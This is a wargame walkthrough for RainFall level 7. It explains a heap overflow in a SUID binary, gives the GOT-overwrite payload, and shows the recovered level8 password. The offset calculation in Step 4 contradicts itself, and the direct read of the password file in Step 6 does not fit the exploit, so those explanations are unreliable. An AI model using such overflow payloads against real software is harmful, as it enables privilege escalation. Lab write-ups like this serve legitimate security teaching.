# RainFall: Level7 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level7@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level7@RainFall:~$ ls -l
-rwsr-s---+ 1 level8 users 7552 Aug 30  2022 level7
```

This binary is SUID-owned by `level8`. The vulnerability lies in a heap-based buffer overflow that allows us to overwrite a function pointer indirectly.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68];

int m() {
    return printf("%s - %d\n", c, time(NULL));
}

int main(int argc, char** argv, char** envp) {
    int* first = malloc(8);
    int* second = malloc(8);

    first[0] = 1;
    first[1] = (int)malloc(8);

    second[0] = 2;
    second[1] = (int)malloc(8);

    strcpy((char*)first[1], argv[1]);
    strcpy((char*)second[1], argv[2]);

    FILE* secret = fopen("/home/user/level8/.pass", "r");
    if (secret != NULL) {
        fgets(c, sizeof(c), secret);
        fclose(secret);
    } else {
        perror("Error opening secret file");
    }

    puts("~~");
    return (0);
}
```

* `first[1]` and `second[1]` point to malloc'ed regions.
* Both `argv[1]` and `argv[2]` are copied into these memory regions using `strcpy`, which is not bounds-checked.
* By overflowing `first[1]`, we can overwrite `second[1]` to point to the GOT entry of `puts`, and then use `second[2]` to overwrite the GOT entry with the address of `m()`.

---

## Step 3: Key Addresses

Function `m()` address:

```bash
0x080484f4  =>  \xf4\x84\x04\x08
```

GOT entry for `puts`:

```bash
objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts => \x28\x99\x04\x08
```

---

## Step 4: Overflow Calculation

We need to overflow `first[1]` so that it overwrites `second[1]`, which comes directly after in heap layout.

Structure layout:

* `first[1] = malloc(8)`
* `second[0] = 2`
* `second[1] = malloc(8)`

To reach `second[1]`, overflow needs:

```
64 (buffer) + 8 (chunk metadata) + 4 (second[0]) + 4 (second[1]) = 80 bytes
```

But only the 8-byte payload in `first[1]` is used for the copy, so we calculate it manually as:

```
first[1] starts at offset 0
+ 8 (for buffer in first[1])
+ 4 (second[0])
= 12 bytes before reaching second[1]
=> Send 20 bytes total to ensure overwrite of second[1]
```

---

## Step 5: Construct Payload

```bash
level7@RainFall:~$ ./level7 \
    $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') \
    $(python -c 'print("\xf4\x84\x04\x08")')
```

This overwrites `second[1]` to point to the GOT entry of `puts`, and then overwrites that GOT entry with the address of `m()`. When `puts("~~")` is called, it instead calls `m()` which prints the flag.

---

## Step 6: Retrieving the Flag

```bash
$ cat /home/user/level8/.pass
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

---

## Step 7: Move to Level08

```bash
level7@RainFall:~$ su level8
Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

